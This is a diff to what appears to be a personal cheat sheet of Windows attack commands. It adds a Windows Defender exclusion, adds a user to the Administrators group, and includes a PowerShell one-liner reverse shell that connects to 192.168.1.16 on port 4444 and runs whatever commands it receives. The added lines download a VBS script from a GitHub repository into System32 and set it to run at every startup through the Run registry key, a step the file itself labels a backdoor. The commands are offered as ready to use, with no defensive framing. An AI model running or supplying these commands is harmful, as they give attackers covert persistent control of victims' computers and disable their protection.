@@ -1,5 +1,5 @@
 powershell Set-MpPreference -ExclusionPath <path> with administrator privs
-to verify it was excluded 
+to verify it was excluded :
 powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
 ---------------------------------------------------------------------------------------------------------------
 net localgroup Administrators /add <username> with administrator privs
@@ -16,4 +16,13 @@ CLS
 ---------------------------------------------------------------------------------------------------------------
 obfuscated powershell 
 $C=new-object net.sockets.tcpclient('192.168.1.16',4444);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+'PS '+(pwd).Path+'> ';$SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()
+---------------------------------------------------------------------------------------------------------------
+backdoor runs with BIOS : with administrator privs
+cd C:\Windows\system32
+curl https://raw.githubusercontent.com/omarsamyX0/shell3/main/start.vbs -o start.vbs
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /t REG_SZ /d "%SystemRoot%\System32\start.vbs" /f
+to verify it's added : 
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start"
+to delete it :
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /f
 ---------------------------------------------------------------------------------------------------------------
